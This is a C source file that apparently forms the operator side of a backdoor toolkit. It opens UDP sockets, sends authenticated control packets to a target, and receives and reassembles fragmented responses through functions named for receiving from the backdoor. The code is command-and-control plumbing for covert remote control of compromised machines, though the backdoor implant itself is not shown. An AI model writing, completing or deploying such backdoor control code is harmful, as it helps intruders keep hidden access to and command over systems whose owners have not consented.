#include "commun.h"
#include "protocol.h"
#include "link_list.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

///////////////////////////////////////////////////////////////////////////////////
SOCKET create_udp_socket()
{
    static int initFlag = 0;
    SOCKET soc = -1;

#ifdef Windows
    WSADATA ws;

    if(initFlag == 0)
    {
        memset(&ws, 0x00, sizeof(ws));
        if(WSAStartup(MAKEWORD(2, 2), &ws) != 0)
        {
            puts("WSAStartup failed");
            exit(-1);
        }
    }
#endif // Windows


    soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(soc != -1)
    {
        //…Ë÷√recv≥¨ ±
#ifdef Linux
        struct timeval timeout= {3,0}; //3s
        int ret=setsockopt(soc,SOL_SOCKET,SO_RCVTIMEO,(const char*)&timeout,sizeof(timeout));
#endif // Linux

#ifdef Windows
        int timeout = 3000; //3s
        int ret=setsockopt(soc,SOL_SOCKET,SO_RCVTIMEO,&timeout,sizeof(timeout));
#endif // Windows
    }

    return soc;
}

struct sockaddr_in bind_udp_dest_addr(char *destIP, int destPort)
{
    struct sockaddr_in destAddr;

    memset(&destAddr, 0x00, sizeof(destAddr));

    destAddr.sin_family = AF_INET;
    destAddr.sin_addr.s_addr = inet_addr(destIP);
    destAddr.sin_port = htons(destPort);

    return destAddr;
}

int send_control_proto_via_udp(SOCKET soc, struct sockaddr_in destAddr, char *destIP, \
                               unsigned short destPort, char *pPayload, unsigned short payloadLen)
{
    int sendLen = 0;
    PROTO_HDR protoHdr;
    unsigned short reserveLen = 0;
    char buff[PKT_BUFF_SIZE];

    memset(buff, 0x00, sizeof(buff));
    memset(&protoHdr, 0x00, sizeof(protoHdr));

    if(soc == -1)
    {
        printf("[-] Socket err.\n");
        exit(-1);
    }

    reserveLen = sizeof(ETH_HEADER) + sizeof(IP_HEADER) + sizeof(UDP_HEADER) + sizeof(PROTO_HDR) + 1;
    if(MTU - reserveLen < payloadLen)
    {
        printf("[-] Payload too long!\n");
        return -1;
    }

    strcat(protoHdr.key, AUTH_KEY);
    protoHdr.type = PROTO_CONTROL;
    protoHdr.payload_len = sizeof(protoHdr) + payloadLen;

    /*
    int idx;
    for(idx=0; idx < sizeof(protoHdr); idx++)
        printf("%02x ", ((unsigned char *)&protoHdr)[idx]);
    puts("");
    */

    memcpy(buff, &protoHdr, sizeof(protoHdr));
    memcpy(buff + sizeof(protoHdr), pPayload, payloadLen);

    sendLen = sendto(soc, buff, protoHdr.payload_len, 0, (struct sockaddr *)&destAddr, sizeof(struct sockaddr));

    return sendLen;
}

int recv_from_backdoor_via_udp(SOCKET soc, struct sockaddr_in srcAddr, char *pBuff, int buffSize)
{
    int recvLen = 0;
    int addrLen = 0;

    memset(pBuff, NULL, buffSize);

    addrLen = sizeof(srcAddr);
    recvLen = recvfrom(soc, pBuff, buffSize, 0, (struct sockaddr *)&srcAddr, &addrLen);

    if(recvLen == -1 && errno == EAGAIN)
    {
        printf("[-] timeout\n");
    }

    return recvLen;
}

int recv_frag_from_backdoor_via_udp(SOCKET soc, struct sockaddr_in srcAddr, char *pRecomBuff)
{
    int recvLen = 0;
    int totalRecv = 0;
    char recvBuff[PKT_BUFF_SIZE];
    PKT_FRAG_HDR *pFragHdr = (PKT_FRAG_HDR *)(recvBuff + sizeof(PROTO_HDR));

    while(1)
    {
        memset(recvBuff, NULL, sizeof(recvBuff));

        recvLen = recv_from_backdoor_via_udp(soc, srcAddr, recvBuff, sizeof(recvBuff));
        if(recvLen <= 0)
        {
            printf("[-] Recv Failed.\n");
            free(pRecomBuff);
            return -1;
        }

        memcpy(pRecomBuff + totalRecv, recvBuff + sizeof(PROTO_HDR) + sizeof(PKT_FRAG_HDR), \
               pFragHdr->payload_len);
        totalRecv += pFragHdr->payload_len;

        if(pFragHdr->fin_flag)
            break;
    }

    return totalRecv;
}










